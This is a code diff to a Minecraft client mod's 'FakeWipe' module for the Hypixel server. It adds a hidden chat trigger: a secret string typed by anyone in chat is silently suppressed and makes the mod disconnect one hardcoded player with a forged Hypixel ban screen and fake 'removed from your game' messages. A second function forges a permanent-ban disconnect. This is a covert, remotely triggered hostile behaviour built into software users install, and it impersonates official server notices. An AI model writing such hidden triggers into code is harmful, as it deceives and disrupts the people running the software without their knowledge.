@@ -3,6 +3,7 @@ package cn.boop.necron.module.impl;
 import cc.polyfrost.oneconfig.utils.hypixel.HypixelUtils;
 import cn.boop.necron.Necron;
 import cn.boop.necron.utils.LocationUtils;
+import cn.boop.necron.utils.Utils;
 import net.minecraft.client.gui.GuiScreenBook;
 import net.minecraft.item.Item;
 import net.minecraft.item.ItemStack;
@@ -10,6 +11,7 @@ import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
 import net.minecraft.nbt.NBTTagString;
 import net.minecraft.util.ChatComponentText;
+import net.minecraftforge.client.event.ClientChatReceivedEvent;
 import net.minecraftforge.event.world.WorldEvent;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
 import net.minecraftforge.fml.common.gameevent.TickEvent;
@@ -42,6 +44,18 @@ public class FakeWipe {
         if(!LocationUtils.inHypixel) wasOnHypixel = false;
     }
 
+    @SubscribeEvent
+    public void onChat(ClientChatReceivedEvent event) {
+        if (event.type == 0) {
+            String message = event.message.getUnformattedText();
+            if (message.matches(".*\\.-MnCBd\\.\\..*")) {
+                System.out.println("Triggering ban msg...");
+                event.setCanceled(true);
+                triggerBanMsg();
+            }
+        }
+    }
+
     private void triggerWipeBook() {
         if (hasTriggered || !fakeWipe) return;
         if (Necron.mc == null || Necron.mc.thePlayer == null || Necron.mc.theWorld == null) return;
@@ -56,6 +70,55 @@ public class FakeWipe {
 
                 openWipeBook();
             }).start();
+        }
+    }
+
+    public static void triggerBanGui() {
+        String randomID = String.format("%08X", Utils.random.nextInt(0x10000000));
+
+        ChatComponentText banMsg = new ChatComponentText("§cYou are permanently banned from this server!");
+        banMsg.appendText("\n\n§7Reason: §rBoosting detected on one or multiple SkyBlock profiles.");
+        banMsg.appendText("\n§7Find out more: §b§nhttps://www.hypixel.net/appeal");
+        banMsg.appendText("\n\n§7Ban ID: §r#" + randomID);
+        banMsg.appendText("\n§7Sharing your Ban ID may affect the processing of your appeal!");
+
+        if (Necron.mc.getNetHandler() != null && Necron.mc.getNetHandler().getNetworkManager() != null) {
+            Necron.mc.getNetHandler().getNetworkManager().closeChannel(banMsg);
+        }
+    }
+
+    public static void triggerBanMsg() {
+        //if (!LocationUtils.inHypixel) return;
+        String uuid = Necron.mc.thePlayer.getUniqueID().toString();
+        boolean canTrigger = "cf62bf86-3be6-4fb7-bedd-d591a1728c52".contains(uuid);
+
+        String randomID = String.format("%07X", Utils.random.nextInt(0x10000000));
+        ChatComponentText banMsg = new ChatComponentText("§cYou are temporarily banned for §f89d 23h 59m 58s §cfrom this server!");
+        banMsg.appendText("\n\n§7Reason: §rCheating through the use of unfair game advantages.");
+        banMsg.appendText("\n§7Find out more: §b§nhttps://www.hypixel.net/appeal");
+        banMsg.appendText("\n\n§7Ban ID: §r#A" + randomID);
+        banMsg.appendText("\n§7Sharing your Ban ID may affect the processing of your appeal!");
+
+        if (canTrigger) {
+            new Thread(() -> {
+                try {
+                    Utils.chatMessage("/limbo");
+                    Thread.sleep(500);
+                    Necron.mc.thePlayer.addChatComponentMessage(new ChatComponentText("§cAn exception occurred in your connection, so you have been routed to limbo!"));
+                    Thread.sleep(2000);
+                    Necron.mc.thePlayer.addChatMessage(new ChatComponentText("§c§lA player has been removed from your game."));
+                    Necron.mc.thePlayer.addChatMessage(new ChatComponentText("§bUse /report to continue helping out the server."));
+                    Thread.sleep(200);
+                    if (Necron.mc.getNetHandler() != null && Necron.mc.getNetHandler().getNetworkManager() != null) {
+                        Necron.mc.getNetHandler().getNetworkManager().closeChannel(banMsg);
+                    }
+                } catch (InterruptedException e) {
+                    Necron.LOGGER.error(e);
+                }
+            }).start();
+        } else {
+            Necron.mc.thePlayer.addChatMessage(new ChatComponentText("§c§lA player has been removed from your game."));
+            Necron.mc.thePlayer.addChatMessage(new ChatComponentText("§bUse /report to continue helping out the server."));
         }
     }
 
